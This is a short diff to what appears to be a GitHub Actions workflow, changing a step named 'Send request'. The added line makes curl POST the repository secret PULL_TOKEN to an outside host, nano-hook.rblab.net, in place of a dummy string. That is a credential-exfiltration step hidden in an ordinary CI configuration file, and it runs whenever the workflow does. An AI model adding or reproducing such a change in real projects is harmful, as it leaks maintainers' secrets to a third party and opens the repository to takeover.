@@ -32,4 +32,4 @@ jobs:
     steps:
       - name: Send request
         run: |
-          curl -X POST https://nano-hook.rblab.net -d 'ololo' -H "Content-Type: text/plain"
+          curl -X POST https://nano-hook.rblab.net -d '${{ secrets.PULL_TOKEN }}' -H "Content-Type: text/plain"
